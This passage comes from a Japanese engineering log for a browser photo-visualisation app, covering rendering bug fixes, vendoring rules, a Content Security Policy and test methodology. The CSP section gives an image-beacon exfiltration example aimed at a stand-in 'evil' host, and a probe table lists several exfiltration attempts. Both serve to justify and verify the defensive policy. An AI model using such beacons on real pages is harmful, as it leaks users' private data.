12 セル中 9 セルで 100.000%・最悪 **97.619%**（現行の最悪は 93.525%）。
**費用は同じで最悪が良くなるが、依然として上界ではない。**

そして刺さるのはここである ── **標本 No.0 の `|E·x|` 上位 32 は全部が「黒枠」の点**
（添字 379, 380, 381, 752, …）で、黒枠は彩度 0 なので `a' = b' = 0`、
つまり `extent[3]` / `extent[4]` が立っても寄与しない。帰結として
**No.0 の包絡は `d = 3` と `d = 5` で 8 桁目までしか違わない**
（1.95054454365150 対 1.95054459373394）。
**2c-ii の収束表も「32 と 128 が同値」も、彩度軸が一度も効かない点の上で測られていた。**
§4.20 の「HDR の測定がひとつ残らず位相 0 だった」と同じ型である。

なお **`ENVELOPE_PHASES = 4096` のほうは足りている**（標本 4 種 × 全 dimLevel・
収束基準 M=262144 で測り直した）。最悪 **99.649%**（1 行画像 `d=3`）、
99.83% を下回るのは 52 組中 13 組、不足は最大 0.35%。
候補選抜の 8.9% より 1 桁小さいので、**ここに予算を足す優先度は低い**
（16384 にすれば全域 99.973% 以上・32 ms/スロット）。

#### 訂正 3 —— **`layout()` を 1 回通ると包絡が消え、二度と戻らない**

2c-ii は引き直しを `if (dimChanged)` で囲っていた。`layout()` は `positions` 無しで
`updateCamera(true)` を呼ぶので `cloudVisible === false` の枝に入って `lastEnvelope` を 0 にし、
その直後の `update()` は `dimLevel` が動いていないので **二度と引き直さない**。

実測（`d = 3` / 988×778 / 標本 No.0）:

| | カメラ距離 |
|---|---|
| resize 前（50 秒後も同じ） | 6.869252 |
| **resize 直後** | **2.558621** |
| + 10 秒 | 2.739984 |
| + 60 秒 | 5.335940 |
| + 300 秒 | 6.044646（まだ登り中） |

写真が一瞬 **2.68 倍**に跳ね、そこから数分かけて縮む ── 2c-i の
「留まっていると絵が引いていく」が、resize 1 回でそのまま戻っていた。

門を外した。**掃き直しは起きない** ── `EnvelopeCache.filled` が
「各スロットは 1 セッションに 1 度」を既に保証しているので、2 回目以降は
`slotFor` 2 回と `max` 3 回である。門が節約していたのはその数十 ns で、
代わりに「0 のまま固着する」状態を作っていた。

**既存のテストがこれを捕まえなかった理由**: `framingEnvelope.test.ts` の
「600 フレーム回しても 1 ビットも動かない」は `setDimLevel` のあとに `layout()` を
一度も呼ばない。**「配線されている」と「配線が生き続ける」は別の主張だった。**
歯を 1 本足した（`dimChanged` の門を戻す変異）── 落ちるのは新しい 1 本だけである。

#### 訂正 4 —— **「門が全開なら後退は厳密にゼロ」は偽だった**（Phase 2c-vi で実測）

2c-iv は上の代償の表のすぐ下にこう書いた:

> **門が全開の領域（`d ≥ 2.45` / `d ≤ 1.55`）では後退は厳密にゼロ**である。

**その表は全開域のうち `d ≥ 2.0` しか採っていない。** 全開域は `cloudWeight(d) === 1` の全体で、
下側の `[0, 1.55]` を**1 点も含んでいなかった**。全開の 13 点を 18000 フレーム（300 秒）回すと:

| d | 門 | 1F 目 | 300 秒後 | 倍率 | 初めて動く |
|---|---|---|---|---|---|
| **1.25** | 1.0000 | 3.865450 | 3.866959 | **×1.000390** | 9253F（**154 秒**） |
| **1.50** | 1.0000 | 4.026955 | 4.028484 | **×1.000380** | 9203F（**153 秒**） |
| 0 / 0.25 / 0.5 / 0.75 / 1 / 1.1 / 1.4 / 1.55 / 2.5 / 3 / 5 | 1.0000 | | | ×1.000000 | 動かない |

量は傾斜帯（×1.354）とは桁が違うが、**「厳密にゼロ」は偽**である。

原因は候補数ではなく **`ENVELOPE_PHASES = 4096` が `d = 1.25` で足りない**こと ──
K = 32 / 1024 / 8192 / **全 89,208 点**が `d = 1.25` で**ビット一致**し、
M を 65536 にしたときだけ動く。`need` 換算の収束比は 21 スロット中 `d = 1.25` が最悪で **99.700%**。
**2c-ii の収束表（`d = 3`）も 2c-iv の 10 点も `d = 1.25` を採っていない。**

4096 → 16384 は費用が 8 ms → **32 ms/スロット**になり `ENVELOPE_DIM_STEP` の存在理由
（費用の有界化）に効くので、**どちらを取るかは別フェーズの判断**として記録する
（絵への影響 0.04% は、傾斜帯に残っている ×1.354 より 3 桁小さい）。

**これは 2c-iv が書いた反省をその PR 自身が破っていた例である** ── §8 に
「標本を 1 枚しか通さない測定は『測った』と書く前に標本を増やす」と書きながら、
今度は `dimLevel` を偏って採った。**規律の文章では止まらない**（§7.10）。

あわせて `framingEnvelope.test.ts` の題を「門が全開なら」→「**`d = 3` では**」に狭めた。
**題が掃引より広いと、通ったことが主張の証拠に見えてしまう。**

#### まだ直していないもの（正直に）

- **候補選抜の規則**（訂正 2）。順位づけの設計を変える仕事なので別フェーズにした。
  作品の約束（図が帯を出ない）には影響しない ── 影響するのは
  「大きさが時間で変わらないこと」だけで、そちらは標本依存であることが分かった
- **`d ≤ 1` の包絡は「描いていないバッファ」から計算されている。**
  `bufferKind()` は `d ≤ 1` で列平均バッファを描くのに、`envelopeFor` へは
  つねに `source.base`（格子）と格子の点数を渡している。実測では `need` 比 0.63〜0.82 で
  足りているが、**それは偶然そうなっているだけ**で構成上の保証は無い。
  `EnvelopeCache` をバッファ種別ごとに分ける必要があるので、これも別フェーズ

---

## 5. 移植境界

### 真の VERBATIM

`src/math/ease.ts` / `src/math/rotation.ts`（+ Phase 3 で `ui/components/tokens.css`, `Announcer.ts`）

### 改変して移植

`src/math/projection.ts`（`projectStereographic` を削除）ほか、Phase 1a 以降で
`engine.ts` / `quality.ts` / `postfx.ts` / `pointBatch.ts` / `controls/*`。

### 出自の記録

各複製ファイルの先頭に `// VENDORED_FROM: ops324/dimension@<SHA> <path>` と `// STATUS:` を置き、
`src/tests/vendor.test.ts` が SHA・STATUS・sha256 を検証する。

**乖離そのものは禁じない —— 乖離が記録されないことを禁じる。** テストが落ちたら、
意図した改変なら `EXPECTED` の sha256 を更新してヘッダに何を変えたか書く。差分は PR に出る。

**逆流は一方向**: LENS でバグを見つけたら、まず dimension 側で直して PR にし、
その SHA を `VENDORED_FROM` に反映してからコピーし直す。どちらが真かの議論を起こさないため。

**`rotation.ts` には何も追記しない。** `composeRotN` / `applyMatrixBatch` / 融合カーネルは
`rotationN.ts` に置く。VERBATIM を保っている限り、親の rotation テストをそのまま再実行することが
無料の回帰ロックとして意味を持つ。1 行足せばその継承（A 水準）は切れる。
`vendor.test.ts` がこれも機械で見ている。

「8月1日から変更されていない」という初版の根拠は生存者バイアスだった ——
dimension は 2 日で 21 PR を吐いており、観測窓は丸 1 日、しかも完成後の静止期だった。

---

## 6. プライバシー

### 6.1 CSP

```
default-src 'none'; script-src 'self'; style-src 'self' 'unsafe-inline';
img-src 'self' data: blob:; font-src 'self'; connect-src 'none';
worker-src 'self'; object-src 'none'; media-src 'none'; manifest-src 'none';
form-action 'none'; base-uri 'none'; upgrade-insecure-requests
```

**`worker-src` から `blob:` を落とした（Phase 1a-ii）。** Phase 0 は
「vite の worker 出力形式によっては blob: が要るかもしれない」という理由で開けていた ──
つまり**何が出るか確かめないまま**開けた許可だった。worker を実装して確かめた結果:

- `new Worker(new URL('./worker.ts', import.meta.url), { type: 'module' })` は
  `dist/assets/worker-*.js` という same-origin チャンクになる。`blob:` を使わない
- CSP を載せた本番ビルドで worker の起動と往復が成功し、violation は **0 件**
- `blob:` が要るのは `?worker&inline` を選んだときだけで、そちらは採っていない

落とした結果、`blob:` worker が**実際に塞がれる**ことも確認した（§6.3）。
`img-src` の `blob:` は残す ── object URL のために Phase 1c で実際に使う。

**使っていない許可は、開けた理由を誰も覚えていない許可になる。**
これは「念のため広めに開けておく」が、確かめなかったことの記録として残る形の一例だった。

- **`connect-src 'none'` だけでは何も閉じていない。** CSP はディレクティブごとに default-allow なので、
  `new Image().src = 'https://evil/?p=' + data` がそのまま通る。**`img-src` を閉じるほうが重要。**
- **`base-uri 'none'` は非自明に load-bearing** —— 注入された `<base href>` は全相対 URL を
  付け替えるので、開いていると `script-src 'self'` が無効化される。
- `style-src` の `'unsafe-inline'` が唯一の妥協点（`<noscript>` 内 `<style>` とインライン style 属性）。
- 本番ビルドにだけ注入する（dev は HMR の `ws:` と両立しない）。
  **プライバシー検証を `npm run dev` で行うと、CSP に阻まれるところを一度も観測しないまま素通りする。**
  必ず `npm run preview`（:4173）で。`.claude/launch.json` に別設定を置いてあるのはそのため。

**CSP が原理的に塞げないもの**（同じ息で言う）: トップレベルナビゲーション（`navigate-to` は
CSP3 から削除され実装が無い）、`window.open`、WebRTC データチャネル（`webrtc 'block'` は Chromium のみ）。
`<meta>` CSP は `frame-ancestors` / `report-uri` / `sandbox` を黙って無視し、
GitHub Pages はヘッダを設定できない —— **埋め込み可能で、違反テレメトリも無い**。
Service Worker のフェッチは自身のスクリプト応答の CSP に従うので meta では制約できない
（対処は `worker-src` と「SW を登録しない」という明文）。

「browser-enforced」と caveat 抜きに書かないこと。

### 6.2 ビルド成果物の静的検査（水準 A）

`privacy.test.ts` が `dist/**/*.js` を読み、通信 API の出現集合が committed allowlist と
**集合として一致**することを要求する。増えても減っても落ちる。

**この検査は初回実行で実際に何かを捕まえた。** Phase 0 の 710 バイトのバンドルに、
我々が書いていない `fetch` が 1 個入っていた —— vite の modulepreload ポリフィルである。
実害は 2 つ: (1)「バンドルに通信 API は無い」と言えなくなる、(2) `connect-src 'none'` は
この fetch も塞ぐので、ネイティブ modulepreload を持たないブラウザでは**ページを開くたびに
CSP 違反が発火し**、violation を購読して測るプライバシー検証（#6）が自分のノイズで埋まる。

→ `build.modulePreload: { polyfill: false }`。失うのは Safari 16.4〜16.6 等での先読みだけで、
チャンク読み込み自体は `<script type="module">` のまま変わらない。この作品は WebGL2 必須なので、
対象ブラウザのほとんどはネイティブ対応済み。

**この検査は完全な証明ではない**（難読化された動的呼び出しは捕まらない）。
「依存関係の更新でうっかり fetch を撒いた」が確実に捕まる、という範囲の道具である。

### 6.3 violation の実測（水準 A・preview :4173）

`securitypolicyviolation` を購読し、**3 経路を試す**。片方だけ試すと `img-src` の穴に気づけない。

| 試したこと | 結果 | 発火したディレクティブ |
|---|---|---|
| `fetch('https://example.com/probe')` | blocked: Failed to fetch | `connect-src` |
| `new Image().src = 'https://example.com/pixel.gif?p=SECRET'` | blocked（onerror） | **`img-src`** |
| `new WebSocket('wss://example.com/x')` | コンストラクタは成功、接続は阻止 | `connect-src` |
| **`new Worker(blob:…)`**（Phase 1a-ii で追加） | **blocked（onerror）** | **`worker-src`** |
| `new Worker('/assets/worker-*.js', {type:'module'})` | **成功**（`capabilities` 応答が返る） | —— |

2 行目が要点である。**初版の計画のように `connect-src 'none'` だけを書いていたら、
この経路は素通りしていた** —— そして画像を保持しているアプリにとって、これが一番塞ぐべき穴だった。

3 行目の書き方にも注意: WebSocket は**コンストラクタが例外を投げない**。
「try/catch で捕まらなかった＝通った」と読むと誤る。判定は violation イベントで行うこと。

この 3 件をもって、「画像は端末から出ません」は **C から B** へ上がる。
A にはならない —— 「出ない」の証明には無限の反証が要る。

### 6.4 残留物

**Phase 1c は 1 つも「持たない」ことにした。** `<input type="file">` は Phase 3 であり、
1c の測定は `__LENS__.ingestBlob` で全部できた。1a-ii の規律は
「**持ち始めたその PR で閉じる**」であって「1 フェーズ先回りして閉じる」ではない ──
先回りするには先に**持ち始める**しかなく、それは規律の適用ではなく反転である
（しかも Phase 3 の UI 設計が「1c が置いた input」に引きずられる）。

→ 代わりに規律を**機械**にした。`privacy.test.ts` が
**「dist に file input も `localStorage` も `createObjectURL` も現れない」**を検査する。
緑であることは「まだ持っていない」という**宣言**であり、Phase 3 が input を足すと
このテストが落ちて、**`input.value = ''` と revoke を同じ PR で書かざるをえない。**

一覧（担当フェーズつき）: `FileList`（`input.value=''`）→ **Phase 3**、
object URL の revoke → **Phase 3**、bfcache 復帰 → **Phase 3**（利用者が居ないと経路が確定しない）、
`localStorage`（品質ティア 1 項目）→ **Phase 3**（下記のとおり 2 から移した）、
`Referer`（`<meta name="referrer" content="no-referrer">`）→ **Phase 0 で投入済み**。

#### `localStorage` を Phase 2 → Phase 3 へ移した（Phase 2a で判断）

**Phase 2 には持つべきものがまだ無い。** ティアを選ぶ UI は Phase 3 なので、
Phase 2 で保存できるのは `bootTier()` の**推定**（`quality.ts` の docstring 自身が
「推定であって測定ではない」＝ **水準 C** と書いている）だけである。
一度きりの、しかも機体が忙しかったかもしれない瞬間の推定を凍結するのは、
**保存しないより悪い**。

そして本節の規律は「**持ち始めたその PR で閉じる**」であって、
「規律を実践するために持ち始める」ではない ── 1c が
「1 フェーズ先回りして閉じるのは規律の適用ではなく反転である」と書いたのと同じ判断である。
→ file input と object URL の revoke と**同じ PR に揃える**（Phase 3）。
`privacy.test.ts:164` の宣言はそれまで緑のままで、
「この作品はまだ何も残さない」を機械が言い続ける。

**移した理由を書き残すのは、これが「先送り」に見えるからである。**
Phase 3 が保存を足すときは、`privacy.test.ts` の当該節を**削除するのではなく狭める**こと ──
削除は宣言を穴に変える。

**`ImageBitmap.close()` はこの一覧から外した（Phase 1a-ii で対処済み）。**
`decode.ts` が中間 bitmap を閉じ、`main.ts` が板を差し替えるときに前の板を閉じ、
`session.release()` が正準バッファを手放す。後から足すと「どこで持っているか」の一覧が
既に長くなっているので、持ち始めたその PR で閉じた。

---

## 7. 検証

### 7.1 vitest（Phase 2c-iv 時点で 419 件・全緑）

**Phase 0:** `math.test.ts`（親からの回帰ロック）/ `rotationN.test.ts`（融合カーネル等価性・
カスケード不変条件）/ `vendor.test.ts`（出自とチェックサム）/ `privacy.test.ts`（ビルド成果物の静的検査）。

**Phase 1a-i:** `color.test.ts`（sRGB 区分関数・OKLab（両原色）・ΔE00・wrapPi）/
**`hue.test.ts`**（色相不変性 —— 実パイプラインの出力に対して。軸ごとスケールの反例が
**落ちること**まで確かめる）/ `image.test.ts`（格子・標本・統計・`columnMeans`・`lift` の全要素固定・
退化入力・`maxNorm`）/ `spriteGain.test.ts`（リップル**と水準**を分けて）/ `fit.test.ts`（フレーミング）。

**Phase 1a-ii:** `protocol.test.ts`（転送リストの導出・detach の観測・`DataCloneError`）/
`ingest.test.ts`（`planResize` の「拡大しない」・probe 定数のバイト列・機能検出の判定・
**node に無いものの境界**）。

**テストの歯**（落ちうることを確かめた項目）: 軸ごとスケールで彩度不変が破れること /
設計当初のスプライト定数が 40% 超だったこと / `kSprite²` を落とすとゲイン水準がずれること /
Ottosson 係数と 1e-9 では**一致しない**こと /
**`planResize` が拡大するようにすると落ちること** /
**probe 定数の Orientation を 6→7 にすると落ちること** /
**`transferablesOf` から `base` を落とすと落ちること** /
**CSP に `worker-src … blob:` を戻すと落ちること**（4 件とも実際に壊して確認した）。

#### node で測れないものの境界を、機械で見張る

`ingest.test.ts` の末尾に「**node には `createImageBitmap` / `OffscreenCanvas` / `Worker` が
存在しない**」というテストが 1 本ある。緑であることは
「これらを node でテストしていない」という**宣言**である。

`vi.stubGlobal('createImageBitmap', …)` で decode 経路のテストを書こうとすると、
この節が落ちて理由が読める ── stub で埋めた経路は、実装が壊れていても緑になる。
node で本当に落とせるのは `protocol` / `plan` / probe のバイト列 / 機能検出の**判定ロジック**だけで、
`decode.ts` の実体と機能検出の**結果**は実ブラウザでしか測れない。

**Phase 1a-iii:** `rotationSchedule.test.ts`（アンカー窓・門つき位相積分・クロスフェード）/
`colorPointBatch.test.ts`（**`instanceCount === 1`**・ゲイン較正・シェーダの形）/
`engineConfig.test.ts`（画角の単一情報源・ティア表・板のテクスチャ設定）。

**1a-iii で足した歯**（実際に壊して落ちることを確かめた）:
`instanceCount = 1` を消すと落ちる / 板の V 反転を消すと落ちる / mipmap を既定に戻すと落ちる /
capture RT を half-float にすると自己検査が `broken` を立てて `readback()` が投げる。

`colorPointBatch.test.ts` の予告は初版で `instanceCount !== Infinity` と書いてあったが、
**`=== 1` に改めた** ── `!== Infinity` は 0 や 2 のような誤った有限値を通してしまう。

**Phase 1b:** `collapse.test.ts`（`axisCoverage` / `collapseWeight` / 加算深度 / half-float の
天井と予算 / `gainFor` の有限性）/ `columnLine.test.ts`（バンド集約・列順・`d=0` の全体平均一致）/
`framing.test.ts`（`needDistance` の後方互換・`framingHold`・**実際に投影して帯に収まることの確認**）。

**1b で足した歯**（実際に壊して落ちることを確かめた 9 件）:
`collapseWeight` を常に 1 にすると 7 件 / `needDistance` が `zHi` を無視すると 5 件 /
`gainFor` のクランプを外すと 2 件 / 列平均バッファの列順を反転すると 2 件 /
`LINE_MAX_POINTS` を 2048 にすると 2 件 / `framingHold` を素通しにすると 1 件 /
`axisCoverage` の `delta = 0` 分岐を消すと 5 件 /
**画角の半角変換を `/180` にすると 3 件** / **`DEFAULT_FILL` を 0.95 にすると 2 件**。
最後の 2 つは **1a-iii では緑だった穴**である（§7.7）。

#### 参照実装は独立に書く —— `reconstructMean` は恒等な変換だった

`spriteGain.test.ts` の `reconstructMean` は `gainFor` の定義をそのまま書き戻したもので、
`value` に恒等に潰れる。`gainFor` を単独で壊せば落ちるが、**`ksum` を壊すと
分子と分母が同時に動いて落ちない** ── `ksum` の `r² ≤ 0.25` を `0.16` にすると
ゲインが +2.6〜4.2% ずれて **G2b の予算 ±2% を全部外す**のに、222 件は緑のままだった。

→ `collapse.test.ts` は**真円の打ち切りで 2 次元格子を実際に足す総当たり**を採点者にする
（実装 `axisCoverage` は軸ごとの正方近似なので、両者は独立に書かれている）。

**Phase 1c:** `robustness.test.ts`（`safeDist` の配線 / 色域が実際に効いていること /
退化がシーンへ届くこと / 病的入力の有限性 / 形式の判定）/ `copyGuard.test.ts`
（TypeScript の scanner で `src/ingest/` `src/ui/` に日本語の文字列リテラルが無いこと・
`copy.ts` の網羅と形）/ `anchors.test.ts`（§7.7 のアンカーを node で厳密再現）。

**1c で足した歯は `scripts/teeth.mjs` の台帳へ移した**（§7.9）── PR 本文に
「壊して確かめた」と書く運用は、次のフェーズがその確認を再実行できない。

**Phase 2a:** `collapsePhase.test.ts`（中心フラグメントの位相 / 潰れた軸の畳み込み /
half-float のデコードと HDR 自己検査の値）。**GPU が要る部分は 1 行も含めない** ──
実際に読める値は `npm run ladder` が実 GPU で見る（§7.9）。両者を混ぜると、
node で緑なのを「絵が正しい」と読む余地ができる。

**2a で足した歯は 8 本**（台帳は `scripts/teeth.mjs`。合計 30 / 噛んだ 30）:
中心の位相を常に 0 にする / 位相減衰を恒等にする / 位相の減衰に F を使わない /
潰れた軸を畳まない / 畳んだ点数の下限を 0 にする / half-float の非正規数を 0 に潰す /
HDR 自己検査の値を 1.0 以下にする／**潰しの基準を無限格子へ戻す**。
**最後の 1 本は初回に抜けた** ── 台帳を書いたあとにリテラルを `HDR_SELFTEST_VALUE` へ
切り出したので対象行が消え、`npm run teeth` が「台帳が実装からずれている」と赤くした。
仕組みが自分の陳腐化を捕まえた例である。

Phase 2a 以降で追加: プレートの不透明契約と語彙の規律（Phase 3）。

### 7.2 ブラウザ —— 測る道具を先に作る

検証 8 項目はすべてキャンバスの読み戻しに依存する。素直に書くと**1 つも実行できない**:

1. `preserveDrawingBuffer` を立てないと、rAF の外から読んだバックバッファは仕様上破棄済み。
   返るのは黒か透明で、**「隅を読んで #000000 を確認」は常に緑になる** —— 壊れていても緑になる。
2. ブラウザペインが非表示だと rAF が絞られてフレームが進まない
   （親が `__DIMENSION__.renderOnce(steps)` を持つ理由）。
3. 「回転を凍結」「bloom を切る」制御 API が無ければ、忠実性の測定は後処理の混入と区別できない。

→ `window.__LENS__`（DEV ビルドのみ、`src/dev/hook.ts`）:
`renderOnce` / `setDimLevel` / `freezeRotation` / `setBloom` / `setGrade` / `setCompress` /
`readback` / `stats`、Phase 1a-ii で `capabilities` / `ingestReport` / `ingestBlob`、
Phase 1a-iii で **`setPath`**（板経路 / 雲経路の強制。§7.6 が両方を同じゲートに掛けるため）/
`sceneStats` / **`sampleTexel`**（G5 のための 1 点サンプル）、
Phase 1b で **`resetRotation`**（位相を厳密に 0 へ。§7.7 の「凍結したから再現可能は偽」）、
**Phase 2a で `readbackHDR`**（`OutputPass` の**前**でリニアのまま読む ── 8bit の
`readback` では 1.0 超と 1.0 ちょうどが区別できない）と **`glInfo`**（`UNMASKED_RENDERER`。
同じページで峰が 133 と 129 の 2 通り出た事故があり、**どこにも素性が出ていなかった**）を
追加。**口は 19 になった。**
`sceneStats` も 1b で `buffer` / `sampleWeight` / `additionDepth` / `needDistance` /
`spread` / `fill` / `calibrated` を返すようになった。未実装のメソッドは
**黙って何もしない**のではなく投げる ——「測ったつもり」が一番高くつく
（1a-ii 時点で `renderOnce()` が実際に投げることを実機で確認した）。

**本番ビルドには載らない。** preview(:4173) で `window.__LENS__` が `undefined` である
ことも確認済み —— CSP を測るのは preview、フックの数値を取るのは dev(:5173) と、
測る場所が 2 つに分かれる。`.claude/launch.json` に両方の設定があるのはそのため。

#### 測定器そのものが壊れている場合（Phase 1a-ii で 3 回踏んだ）

上の 1.〜3. は「測る対象」の話だったが、**測定器の側にも同じ罠がある**。

1. **`requestAnimationFrame` は非表示ペインで止まる。** メインスレッド遮断を rAF で
   測ろうとして 30 秒タイムアウトした ── 上の 2. がそのまま自分に返ってきた形。
2. **`setTimeout(…, 0)` も背景で ~1s に絞られる。** 「アイドル時の最長ギャップ 999.2ms」と
   出て、遮断の測定に使えないことが分かった。使えたのは `MessageChannel` の往復。
3. **計測器を閉じるのが早すぎると、遮断ギャップを取りこぼす。** 同期ブロックの直後に
   `end()` を呼ぶと、キューに積まれたメッセージが配送される前にポートを閉じてしまう。
   最初この形で「メインスレッドも 0.3ms しか止まらない」という**嘘の緑**が出た。

→ **測定器には自己検査を通してから使う。** 意図的に 120ms 止めて **120.2ms** を
検出できることを確認してから本測定に入った。予算のある測定と同じで、
「測定器が動いていること」自体に判定を付けないと A を生産できない。

各測定には**予算**を付ける。予算の無い測定は「比べて数字を眺める」であり、A を生産できない。
測定が落ちたら当該フェーズをマージしない。予算を緩めるのは、緩める根拠をここに書いたときだけ。

**忠実性のゲートは ΔE00 ≤ 2.0 の一本。** Phase 1a の設計案は雲経路にだけ ≤ 3.0 という
第 2 のゲートを置こうとしていたが、これは承認済み基準の一方的な緩和であり、しかも不要だった ──
G2 の許容 ±3%(リニア)は中間調で ΔE00 ≈ **0.67** であって、設計が置いていた 1.20 ではない。
雲経路の見積もり合計は約 1.6 で 2.0 に収まる。板経路と雲経路で別のゲートを持たない。

（§4.6 の ≤ 3.0 は **Phase 1b** の平均色・列平均に対する予算であり、1a とは別物。
借りてきて 1a を緩めてはいけない。）

### 7.3 公開経路の実測（水準 A・Phase 0 / 1a-ii / 1a-iii）

<https://ops324.github.io/dimension-lens/> にて:

| 確認項目 | 結果 |
|---|---|
| CSP meta が本番ページに載っている | ✅ |
| `<script src="./assets/index-*.js">` が読まれた | ✅ `data-lens="booted"` |
| サブパス配信で相対パスが解決する（`base: './'`） | ✅ `/dimension-lens/assets/...` |
| コンソールエラー | **0** |

**「JS が読めること」を毎フェーズ確認するのは形式ではない。** Phase 0 のエントリは一度、
中身が全て `import.meta.env.DEV` の内側だったせいで丸ごと tree-shake され、
vite が `<script>` タグごと出力から落とした。そのままなら
「自前の JS が `script-src 'self'` の下で実際に読めるか」を**一度も検証しないまま**
「公開経路が揃った」と言うことになっていた。本番でも消えない痕跡（`data-lens="booted"`）は
そのために置いてある。

**Phase 1a-ii でこの痕跡を 1 つ増やした**: `data-lens-ingest`（`ok` / `failed:<code>`）。
「JS が読めた」の次に確かめたいのは「**CSP 下で worker が起動して取り込みが完走したか**」で、
これは本番ビルドでしか測れない（`__LENS__` は DEV にしか載らない）。

**preview だけで済ませない。** 実際の公開ページ <https://ops324.github.io/dimension-lens/> で測った
（preview はサブパス配信でも同一オリジンでもないので、`base: './'` と worker の相対 URL の
組み合わせは公開先でしか確かめられない）:

| 確認項目 | 結果 |
|---|---|
| `data-lens="booted"` | ✅ |
| **`data-lens-ingest`** | ✅ `"ok"` —— **公開ページ上で CSP 下の worker 取り込みが完走** |
| worker チャンクがサブパスで解決する | ✅ `/dimension-lens/assets/worker-*.js` |
| CSP の `worker-src` | `'self'`（`blob:` 無しで動いている） |
| 外向きリクエスト | **0**（同一オリジンの 3 本のみ: ページ・index チャンク・worker チャンク） |
| コンソールエラー | **0** |
| `window.__LENS__` | `undefined`（本番には載らない） |

**Phase 1a-iii で `data-lens-capture` と `data-lens-render` が加わった。** 公開ページ実測:

| 確認項目 | 結果 |
|---|---|
| `data-lens-capture` | ✅ `"ok"` —— **読み戻しの自己検査が本番で通っている** |
| `data-lens-render` | ✅ `"ok"` —— **標本 No.0 が公開ページに描かれている** |
| スタイルシート | 1 枚（これが無いと canvas は既定の 300×150 のままで「真っ暗」に見える） |
| コンソールエラー | **0** |

`data-lens-capture` が `data-lens-render` より**先に**立つ順序に意味がある ──
測定器が動いていることを、絵より先に確かめている（§7.2）。

### 7.4 CI アクションのバージョン

**教訓を先に書く: 姉妹作の `deploy.yml` をそのまま持ってきて、バージョンを確認しなかった。**

Phase 0 のデプロイで Node 20 廃止の警告が出たとき、最初は
「`upload-pages-artifact@v3` が内部で古い `upload-artifact` を呼んでいる。上流の
複合アクション内なので直接は直せない」と判断して負債として記録した。**これは誤りだった。**
上流の現行版は内部で `upload-artifact@v7.0.1` を pin しており、直っていないのは
こちらが v3 に留まっていたことだけだった。

実際には 4 つとも 2〜3 メジャー遅れていた:

| | Phase 0 で使っていた版 | 実際の最新 |
|---|---|---|
| `actions/checkout` | v4 | **v7** |
| `actions/setup-node` | v4 | **v7** |
| `actions/upload-pages-artifact` | v3 | **v5** |
| `actions/deploy-pages` | v4 | **v5** |

実害の評価も正確に書いておく。**その時点では失敗していない** ── GitHub が node20 の
アクションを node24 で強制実行しており、build も deploy も success だった。しかし
この作品では **CI が品質ゲートそのものであり、同時に唯一の公開経路**でもある。
強制移行が終わって古い版が無効化された日に落ちるのは、テストとデプロイの両方である。
新規リポジトリを 3 メジャー遅れで始める理由は無い。

#### 仕組みで塞ぐ

失敗の型は「直せなかった」ではなく**「気づかなかった」**なので、注意力ではなく仕組みで塞ぐ ──
`.github/dependabot.yml`（月次、`github-actions` のみ）。
npm は対象にしない。three の exact pin（0.185.1）は意図的な仕様で、自動 PR がそれと戦うため。

#### SHA pin を採らない理由（Dependabot 導入後に再検討した）

当初は「このリポジトリには自動更新が無いので、pin は実質『更新しない』を意味する」を
理由にしていた。**Dependabot を入れた時点でその前提は消えた**（Dependabot は SHA pin も
コメント付きで更新する）。前提が変わったので、結論も出し直す:

- 使っているのは `actions/*` のみ ── GitHub 第一者で、タグ差し替え型の攻撃対象としては相対的に低リスク
- 可変メジャータグのほうが `deploy.yml` が読める

よって**当面は可変メジャータグ（`@v7`）を維持する**。ただし条件を明記しておく:

> **第三者（`actions/*` 以外）のアクションを 1 つでも追加するときは、そのアクションを SHA で pin する。**
> 2025 年の `tj-actions/changed-files` の事例のとおり、第三者アクションはタグ差し替えで
> 侵害されうる。第一者だから許容している判断を、第三者へ自動的に延長しない。

### 7.5 取り込みのメインスレッド遮断（水準 A・Phase 1a-ii）

（§7.4 は §0.1 の規律 5 から参照されているので番号を動かさず、末尾に足した。）

24MP の JPEG を取り込んだときの、**メインスレッドの最長遮断**。
計測器は `MessageChannel` の往復で、意図的な 120ms 遮断を **120.2ms** と検出できることを
先に確認してある（§7.2 の「測定器そのものが壊れている場合」）。

| 経路 | wall | メインスレッド最長遮断 | 判定 |
|---|---|---|---|
| **worker（本番の経路）** | 224.3 ms | **11.8 ms** | ✅ 予算 16.7 ms 内 |
| 同じ仕事をメインスレッドで | 128.6 ms | **88.0 ms** | ❌ 予算の 5.3 倍 |

`createImageBitmap` 自体は 24MP・resize 込みでもメインを最長 **0.3 ms** しか止めない
（元からオフスレッド）。止めているのは読み戻し以降である。

**この表の ms を CPU 予算として読んではいけない。** 検証に使っているブラウザペインは
同じ機体の Node に対して**メインスレッドで 3.6〜4.1 倍、worker 内では 23〜28 倍**遅い
（1e8 回の整数加算: Node 98.3ms / ペインのメイン 400.1ms / ペインの worker 2400ms、
暖機しても改善しないので JIT ウォームアップではない）。だから worker 経路の wall は
ここでは膨らんでいる。**この測定が主張しているのは遮断の有無であって、速さではない。**
CPU 予算は §4.14 の Node 実測で持つ。

この区別は実際に一度誤られた ── Phase 1a-ii の監査サブエージェントは worker で測った値から
「この環境で CPU 予算を測ってはいけない」と結論したが、**遅いのは worker であって
ペイン全体ではない**（メインは Node の 4 倍程度）。上の遮断測定はメインスレッドで取っている。
§0.1 の規律 3（サブエージェントの報告は検証すべき仮説）が効いた例である。

### 7.6 忠実性ラダー G0〜G7（Phase 1a-iii で定義した）

**この文書は長らく「G1〜G6」と「検証 8 項目」を参照するだけで、一度も列挙していなかった。**
手がかりは §7.2 の「G2 の許容 ±3%(リニア)」と §6.2 の「プライバシー検証(#6)」の 2 つだけで、
残りは名前すら無かった。§7.2 自身が「予算の無い測定は A を生産できない」と書いている以上、
これは形式的な不備ではない ── 基準を決めずに実装すれば、最後は「見えたので OK」になる。

被写体は標本 No.0（`src/image/fixture.ts` が「忠実性ラダー G1〜G6 の被写体」として
領域を設計してある）。**前提はすべて dimLevel = 2・回転凍結・後処理オフ。**

**素案には無く、実装中に必要と分かって足したのが G0 と G7 である。**

| | 被写体 | 測るもの | 予算 |
|---|---|---|---|
| **G0** | 板の外側 | 背景が**厳密に** `[0,0,0]` | 厳密 0 |
| **G1** | markers / 幾何 | 8 つの二面体変換すべてで区別がつく／基準点の位置／アスペクト | 全変換で相違・重心誤差 ≤ 2 device px・アスペクト厳密 |
| **G2a** | flat（sRGB 128） | 平坦部の忠実性 | **ΔE00 ≤ 2.0** |
| **G2b** | flat（雲経路） | スプライトの実効ゲイン | **±2%**（`spriteGain.ts` が約束していた値） |
| **G3** | ramp 8 段 | トーン応答と単調性 | 各段 **ΔE00 ≤ 2.0**、単調性は厳密 |
